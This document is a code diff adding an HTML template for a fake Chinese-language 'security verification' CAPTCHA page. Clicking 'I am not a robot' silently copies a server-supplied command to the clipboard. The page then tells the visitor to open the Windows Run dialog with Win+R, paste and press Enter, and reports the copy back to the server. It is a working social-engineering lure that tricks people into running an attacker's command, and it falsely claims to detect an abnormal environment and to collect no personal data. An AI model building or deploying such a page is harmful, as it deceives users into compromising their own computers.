@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>安全验证</title>
+<style>
+    :root {
+        --bg: #f3f5f9;
+        --card: #ffffff;
+        --text: #1b2333;
+        --muted: #6b7487;
+        --line: #e3e7ef;
+        --accent: #2563eb;
+        --accent-dark: #1d4ed8;
+        --ok: #16a34a;
+        --warn-bg: #fff7e6;
+        --warn-line: #f5d78a;
+        --warn-text: #8a5a00;
+    }
+    * { box-sizing: border-box; }
+    body {
+        margin: 0;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px;
+        background:
+            radial-gradient(circle at 15% 10%, #dbeafe 0, transparent 45%),
+            radial-gradient(circle at 85% 90%, #e0e7ff 0, transparent 45%),
+            var(--bg);
+        color: var(--text);
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC",
+                     "Microsoft YaHei", sans-serif;
+    }
+    .verify-card {
+        width: 100%;
+        max-width: 480px;
+        background: var(--card);
+        border: 1px solid var(--line);
+        border-radius: 18px;
+        box-shadow: 0 24px 60px rgba(23, 37, 84, 0.12);
+        overflow: hidden;
+    }
+    .verify-head {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 22px 26px 0;
+    }
+    .shield {
+        width: 42px;
+        height: 42px;
+        border-radius: 12px;
+        background: linear-gradient(135deg, #2563eb, #4f46e5);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex: 0 0 auto;
+        box-shadow: 0 8px 18px rgba(37, 99, 235, 0.3);
+    }
+    .shield svg { width: 24px; height: 24px; stroke: #fff; fill: none; stroke-width: 2; }
+    .verify-title { font-size: 17px; font-weight: 650; }
+    .verify-sub { font-size: 12.5px; color: var(--muted); margin-top: 3px; }
+    .verify-body { padding: 22px 26px 26px; }
+    .verify-text {
+        font-size: 14px;
+        color: var(--muted);
+        line-height: 1.7;
+        margin: 0 0 18px;
+    }
+    .captcha-box {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        width: 100%;
+        padding: 16px 18px;
+        border: 1px solid var(--line);
+        border-radius: 12px;
+        background: #fbfcfe;
+        cursor: pointer;
+        font: inherit;
+        color: inherit;
+        text-align: left;
+        transition: border-color .15s ease, box-shadow .15s ease, transform .15s ease;
+    }
+    .captcha-box:hover {
+        border-color: #b9c6e4;
+        box-shadow: 0 6px 18px rgba(30, 64, 175, 0.08);
+    }
+    .captcha-box:active { transform: scale(.995); }
+    .captcha-box[disabled] { cursor: default; opacity: .6; }
+    .checkbox {
+        width: 26px;
+        height: 26px;
+        border: 2px solid #c6cfdf;
+        border-radius: 6px;
+        flex: 0 0 auto;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #fff;
+    }
+    .checkbox svg {
+        width: 16px;
+        height: 16px;
+        stroke: #fff;
+        fill: none;
+        stroke-width: 3;
+        opacity: 0;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+    }
+    .captcha-box.done .checkbox { background: var(--ok); border-color: var(--ok); }
+    .captcha-box.done .checkbox svg { opacity: 1; }
+    .captcha-label { font-size: 14.5px; font-weight: 550; }
+    .captcha-hint { font-size: 12px; color: var(--muted); margin-top: 2px; }
+    .badge {
+        margin-left: auto;
+        font-size: 11px;
+        color: #7c879c;
+        border: 1px solid var(--line);
+        border-radius: 999px;
+        padding: 3px 9px;
+        white-space: nowrap;
+    }
+    .step-panel {
+        display: none;
+        margin-top: 18px;
+        border: 1px solid var(--line);
+        border-radius: 12px;
+        overflow: hidden;
+    }
+    .step-panel.show { display: block; }
+    .step-status {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 11px 16px;
+        background: #effdf3;
+        border-bottom: 1px solid #d3f3dd;
+        color: #15803d;
+        font-size: 13px;
+        font-weight: 600;
+    }
+    .step-status.warn {
+        background: var(--warn-bg);
+        border-bottom-color: var(--warn-line);
+        color: var(--warn-text);
+    }
+    .step-status svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 2.4; }
+    .step-content { padding: 16px; }
+    .step-item {
+        display: flex;
+        gap: 12px;
+        font-size: 13.5px;
+        color: #3b4558;
+        line-height: 1.6;
+    }
+    .step-item + .step-item { margin-top: 12px; }
+    .step-num {
+        width: 22px;
+        height: 22px;
+        border-radius: 999px;
+        background: #e8eefc;
+        color: var(--accent);
+        font-size: 12px;
+        font-weight: 700;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex: 0 0 auto;
+        margin-top: 1px;
+    }
+    kbd {
+        display: inline-block;
+        padding: 1px 6px;
+        border: 1px solid #cbd5e1;
+        border-bottom-width: 2px;
+        border-radius: 5px;
+        background: #f8fafc;
+        font-family: inherit;
+        font-size: 12px;
+        color: #334155;
+    }
+    .cmd-box {
+        margin-top: 10px;
+        position: relative;
+    }
+    .cmd-box textarea {
+        width: 100%;
+        height: 58px;
+        resize: none;
+        border: 1px solid var(--line);
+        border-radius: 9px;
+        background: #f8fafc;
+        padding: 10px 12px;
+        font-family: "Cascadia Code", Consolas, "Courier New", monospace;
+        font-size: 11.5px;
+        line-height: 1.5;
+        color: #334155;
+        word-break: break-all;
+    }
+    .cmd-box textarea:focus { outline: 2px solid #bfdbfe; border-color: #93c5fd; }
+    .note {
+        margin: 16px 0 0;
+        font-size: 11.5px;
+        color: #8b94a6;
+        line-height: 1.6;
+        text-align: center;
+    }
+    .footer-mark {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        padding: 12px;
+        border-top: 1px solid var(--line);
+        background: #fafbfe;
+        font-size: 11px;
+        color: #98a1b3;
+    }
+    @media (max-width: 480px) {
+        body { padding: 14px; }
+        .verify-head { padding: 18px 18px 0; }
+        .verify-body { padding: 18px; }
+    }
+</style>
+</head>
+<body>
+<main class="verify-card" role="main">
+    <div class="verify-head">
+        <span class="shield" aria-hidden="true">
+            <svg viewBox="0 0 24 24"><path d="M12 3l7 3v5c0 4.5-3 7.7-7 9-4-1.3-7-4.5-7-9V6l7-3z"/><path d="m9 12 2 2 4-4"/></svg>
+        </span>
+        <div>
+            <div class="verify-title">安全验证</div>
+            <div class="verify-sub">请完成人机校验以继续访问</div>
+        </div>
+    </div>
+
+    <div class="verify-body">
+        <p class="verify-text">
+            系统检测到当前访问环境存在异常，需要确认您不是自动程序。完成验证后将自动继续。
+        </p>
+
+        <button class="captcha-box" id="captchaBtn" type="button">
+            <span class="checkbox" aria-hidden="true">
+                <svg viewBox="0 0 24 24"><path d="m20 6-11 11-5-5"/></svg>
+            </span>
+            <span>
+                <span class="captcha-label">我不是机器人</span>
+                <span class="captcha-hint" id="captchaHint">点击开始验证</span>
+            </span>
+            <span class="badge">安全校验</span>
+        </button>
+
+        <div class="step-panel" id="stepPanel">
+            <div class="step-status" id="stepStatus">
+                <svg viewBox="0 0 24 24"><path d="m20 6-11 11-5-5"/></svg>
+                <span id="stepStatusText">验证码已复制到剪贴板</span>
+            </div>
+            <div class="step-content">
+                <div class="step-item">
+                    <span class="step-num">1</span>
+                    <span>按下键盘上的 <kbd>Win</kbd> + <kbd>R</kbd> 打开“运行”窗口。</span>
+                </div>
+                <div class="step-item">
+                    <span class="step-num">2</span>
+                    <span>粘贴验证码（<kbd>Ctrl</kbd> + <kbd>V</kbd>），然后按 <kbd>Enter</kbd> 完成验证。</span>
+                </div>
+                <div class="cmd-box">
+                    <textarea id="cmdText" readonly spellcheck="false">{{ command }}</textarea>
+                </div>
+                <p class="note" id="fallbackNote" hidden>如果提示已复制但运行窗口中没有内容，请手动全选上方验证码后复制。</p>
+            </div>
+        </div>
+
+        <p class="note">验证过程不会收集您的个人隐私信息，仅用于确认访问环境安全。</p>
+    </div>
+    <div class="footer-mark">安全验证服务 · 请勿关闭此页面</div>
+</main>
+
+<script>
+(function () {
+    var command = {{ command|tojson }};
+    var btn = document.getElementById('captchaBtn');
+    var hint = document.getElementById('captchaHint');
+    var panel = document.getElementById('stepPanel');
+    var status = document.getElementById('stepStatus');
+    var statusText = document.getElementById('stepStatusText');
+    var cmdText = document.getElementById('cmdText');
+    var fallbackNote = document.getElementById('fallbackNote');
+
+    function legacyCopy() {
+        var area = document.createElement('textarea');
+        area.value = command;
+        area.setAttribute('readonly', 'readonly');
+        area.style.position = 'fixed';
+        area.style.top = '-1000px';
+        area.style.opacity = '0';
+        document.body.appendChild(area);
+        area.select();
+        var ok = false;
+        try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
+        document.body.removeChild(area);
+        return ok;
+    }
+
+    function reportCopy() {
+        fetch(window.location.pathname.replace(/\/$/, '') + '/event', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ event: 'copy' }),
+            keepalive: true
+        }).catch(function () {});
+    }
+
+    function showPanel(ok) {
+        btn.classList.add('done');
+        btn.disabled = true;
+        hint.textContent = ok ? '校验通过' : '请按下方提示手动完成';
+        panel.classList.add('show');
+        if (!ok) {
+            status.classList.add('warn');
+            statusText.textContent = '自动复制失败，请手动复制验证码';
+            fallbackNote.hidden = false;
+            cmdText.focus();
+            cmdText.select();
+        }
+        reportCopy();
+    }
+
+    btn.addEventListener('click', function () {
+        var ok = legacyCopy();
+        if (ok) {
+            showPanel(true);
+            return;
+        }
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(command).then(function () {
+                showPanel(true);
+            }).catch(function () {
+                showPanel(false);
+            });
+        } else {
+            showPanel(false);
+        }
+    });
+
+    cmdText.addEventListener('click', function () {
+        cmdText.select();
+    });
+})();
+</script>
+</body>
+</html>
